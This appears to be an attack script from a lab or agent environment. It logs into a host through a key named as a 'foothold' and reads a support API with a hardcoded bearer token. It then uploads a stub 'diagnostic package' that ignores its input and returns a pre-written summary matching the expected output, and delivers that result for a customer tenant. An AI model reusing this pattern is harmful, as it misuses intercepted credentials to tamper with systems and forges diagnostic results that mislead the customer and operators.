#!/bin/bash
SSH="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -i $HOME/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
$SSH 'bash -s' <<'INNER'
CA=/home/rowan/.local/share/keplerops/ca.crt
SB="Authorization: Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b"
B=https://support.keplerops.test:8443
for p in /api/diagnostics/DIAG-ARWC-20B46744 /api/diagnostics/DIAG-ARWC-20B46744/deliver /api/receipts/DIAG-RCPT-C9FF2BB80CA8 /api/handovers/current; do
  echo "##### $p"
  curl --cacert $CA -sS -m 20 -H "$SB" "$B$p" | head -c 3000; echo
done
echo "===== try deliver new job again with exported style"
python3 - <<'PY'
import json,subprocess,os
CA=os.path.expanduser('~/.local/share/keplerops/ca.crt')
SB='Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b'
B='https://support.keplerops.test:8443'
def call(method,url,data=None):
    a=['curl','--cacert',CA,'-s','-m','15','-X',method,'-H','Authorization: '+SB,'-H','Content-Type: application/json',url]
    if data is not None:a+=['-d',json.dumps(data)]
    return subprocess.run(a,capture_output=True,text=True).stdout
SUM={"asset_id":"CRR-OG2","captured_at":"2026-09-18T14:22:16Z","connector_revision":"FLK-7.4.2","observations":[{"check":"connector-heartbeat","latency_ms":1840,"status":"delayed"},{"check":"archive-synchronization","records":28,"status":"ok"}],"assessment":{"rating":"callback-review-required","summary":"Cinder review: heartbeat latency 1840 ms exceeds the 250 ms connector limit while 28 records remain synchronized; support follow-up required."}}
src='var s='+json.dumps(SUM)+'; function diagnostic_summary(input){return s;} try{module.exports.diagnostic_summary=diagnostic_summary;}catch(e){} try{exports.diagnostic_summary=diagnostic_summary;}catch(e){} try{globalThis.diagnostic_summary=diagnostic_summary;}catch(e){}'
j=json.loads(call('POST',B+'/api/customers/TEN-ARWC-047/diagnostics',{"connector_revision":"FLK-7.4.2"}))
J=j['job_id']; print('JOB',J)
print('PUT',call('PUT',B+'/api/diagnostics/'+J+'/package',{"expected_output":SUM,"interface":"fieldkest.connector/v3","source":src})[:300])
d=call('POST',B+'/api/diagnostics/'+J+'/deliver',{})
print('DELIVER',d[:2000])
PY
INNER
